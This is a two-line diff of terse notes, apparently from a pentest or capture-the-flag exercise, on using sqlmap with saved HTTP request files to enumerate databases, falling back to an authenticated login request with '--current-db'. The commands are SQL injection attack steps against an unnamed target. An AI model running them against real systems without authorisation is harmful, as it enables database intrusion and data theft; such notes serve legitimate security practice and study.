@@ -1,0 +1,2 @@
+First normal sqlmap -r request.txt --dbs
+Took long time and gave no results, so narrow down the database, by sending a login request with a created account. sqlmap -r login.txt --current-db
